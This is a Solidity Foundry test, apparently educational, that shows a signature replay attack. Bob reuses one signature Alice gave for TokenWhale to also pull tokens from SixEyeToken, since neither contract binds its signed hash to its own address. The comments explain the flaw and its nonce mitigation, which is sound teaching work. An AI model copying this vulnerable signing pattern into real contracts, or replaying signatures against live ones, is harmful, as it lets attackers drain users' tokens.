// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/*
Name: Signature Replay Vulnerability

Description:
In this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account 
to Bob's account. Bob then replays this signature on multiple contracts 
(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens 
from Alice's account to his. This is possible because the contracts use the same methodology for signing
and validating transactions, but they do not share a nonce to prevent replay attacks.

Missing protection against signature replay attacks, Same signature can be used multiple times to execute a function.

Mitigation:
Replay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process. 

REF:
https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57
https://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25

*/

contract ContractTest is Test {
    TokenWhale TokenWhaleContract;
    SixEyeToken SixEyeTokenContract;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    constructor() {
        TokenWhaleContract = new TokenWhale();
        TokenWhaleContract.TokenWhaleDeploy(address(this));
        TokenWhaleContract.transfer(alice, 1000);
        SixEyeTokenContract = new SixEyeToken();
        SixEyeTokenContract.TokenWhaleDeploy(address(this));
        SixEyeTokenContract.transfer(alice, 1000);
    }

    function testSignatureReplay() public {
        bytes32 h = keccak256(
            abi.encodePacked(alice, bob, uint256(499), uint256(1), uint256(0))
        );
        //Alice is giving the signature only for the one contract - TokenWhaleContract
        vm.prank(alice);
        (uint8 _v, bytes32 _r, bytes32 _s) = vm.sign(1, h);

        address aliceAddress = ecrecover(h, _v, _r, _s);
        console.log(
            "alice actual address and fetched ecrecover address should match",
            alice,
            aliceAddress
        );
        vm.prank(bob);

        TokenWhaleContract.transferProxy(
            alice,
            bob,
            uint256(499),
            uint256(1),
            _v,
            _r,
            _s
        );

        //bob is replaying the attack in other contracts
        vm.prank(bob);
        SixEyeTokenContract.transferProxy(
            alice,
            bob,
            uint256(499),
            uint256(1),
            _v,
            _r,
            _s
        );
        console.log(
            "attacked bob has received both balances from two different contracts",
            TokenWhaleContract.balanceOf(bob),
            SixEyeTokenContract.balanceOf(bob)
        );
    }
}

contract TokenWhale is Test {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        emit log_named_uint("nonce", nonce);
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]
        ) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.sender] += _feeUgt;

        balanceOf[_from] -= _value + _feeUgt;
        nonces[_from] = nonce + 1;
        return true;
    }
}

contract SixEyeToken is Test {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Six Eye Token";
    string public symbol = "SIX";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]
        ) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.sender] += _feeUgt;

        balanceOf[_from] -= _value + _feeUgt;
        return true;
    }
}
